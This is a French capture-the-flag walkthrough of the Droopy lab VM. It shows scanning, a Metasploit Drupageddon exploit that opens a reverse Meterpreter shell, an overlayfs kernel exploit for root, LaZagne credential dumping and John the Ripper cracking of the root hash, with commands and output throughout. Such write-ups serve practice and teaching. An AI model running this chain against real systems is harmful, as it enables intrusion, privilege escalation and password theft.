# DroopyCTF

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.196
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.196...100%
[+] Scan Nmap 192.168.56.196...100%
 
[+] 80/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.196-tcp.html     |
==========================================================
```

&nbsp;

**Rapport Nmap**

![Capture du 2025-04-16 13-19-43](https://github.com/user-attachments/assets/8afe7517-8e8c-48fb-b43d-000d0371ffc5)

&nbsp;

<span style="color: #dddddd;">💥</span> **Metasploit - drupal_drupageddon** 

Exploitation de la `CVE` trouver par `nmap` ( cve-2014-3704)

```
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set lhost 192.168.56.149
lhost => 192.168.56.149
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set rhosts 192.168.56.196
rhosts => 192.168.56.196
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Sending stage (40004 bytes) to 192.168.56.196
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.196:55448) at 2025-04-16 19:05:25 +0200

(Meterpreter 1)(/var/www/html) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> LinPeas**

Élévation de privilege avec linpeas

```
www-data@droopy:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ 
[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

```

&nbsp;

&nbsp;

**<span style="color: #dddddd;">💀</span> Exploit Overlays**

Test de l'exploit trouver precedement

```
www-data@droopy:/tmp$ gcc overlays.c   
gcc overlays.c
www-data@droopy:/tmp$ ./a.out
./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# bash -i
root@droopy:/tmp#
```

&nbsp;

<span style="color: #dddddd;">👾</span> **LaZagne**

Cherchons des mot de passe sur la machine

```
root@droopy:/tmp/LaZagne-2.4.6/Linux# python laZagne.py all
python laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Password found !!!
Login: gsuser
Password: gsuser

[+] Hash found !!!
Login: root
Hash: $6$fSUKb/ov$EFE6LjrVpz2yJrd2QSQEe/mGQ.8q3xXi9s5CJL95ngeh95PS91e10XLav4gRE1z4jv1Wmb6WH24yVQA6GKwEl/:16415:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.15886497498
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du mot de passe `root`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $john droop 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
toor             (root)     
1g 0:00:00:00 DONE 1/3 (2025-04-16 19:30) 16.66g/s 166.6p/s 166.6c/s 166.6C/s rootroot..RootRoot
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| root | toor |
| gsuser | gsuser |
